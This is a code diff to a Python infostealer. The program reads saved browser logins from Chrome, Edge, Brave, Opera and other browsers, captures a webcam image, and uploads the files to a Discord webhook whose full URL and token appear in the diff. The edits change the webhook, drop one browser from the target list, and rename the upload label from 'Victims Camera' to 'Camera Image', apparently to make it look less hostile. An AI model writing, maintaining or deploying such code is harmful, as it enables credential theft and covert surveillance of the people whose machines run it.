@@ -21,7 +21,7 @@ import pyautogui
 import sqlite3
 import tempfile
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1431703761818091571/n1pzj1rBHUjjiAyIXIVPQWRiYetnEpyGBRL-p_oZNm5aiqbXlG-oBuua_MsV3JKRsXVG"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1439340174340390913/ma4jamCgF3dVLl8RG5pQjvN1DB7Ns45bfPk87-MEJwHwoRnmToA46trbe9ep-yCWBE-m"
 
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
@@ -246,8 +246,6 @@ def get_login_path(browser):
         return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
     elif browser == "Edge":
         return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
-    elif browser == "Zen":
-        return os.path.join(os.getenv("LOCALAPPDATA"), "Zen", "User Data", "Default", "Login Data")
     elif browser == "Opera":
         return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
     elif browser == "Opera GX":
@@ -376,7 +374,7 @@ def main():
                 continue
 
     
-    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Zen", "Opera", "Opera GX"]
+    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
     installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]
 
     if not installed_browsers:
@@ -419,7 +417,7 @@ def main():
     if image is not None:
         image_path = 'captured_image.jpg'
         cv2.imwrite(image_path, image)
-        send_file_to_discord(image_path, message="Victims Camera")
+        send_file_to_discord(image_path, message="Camera Image")
         created_files.append(image_path)
 
     
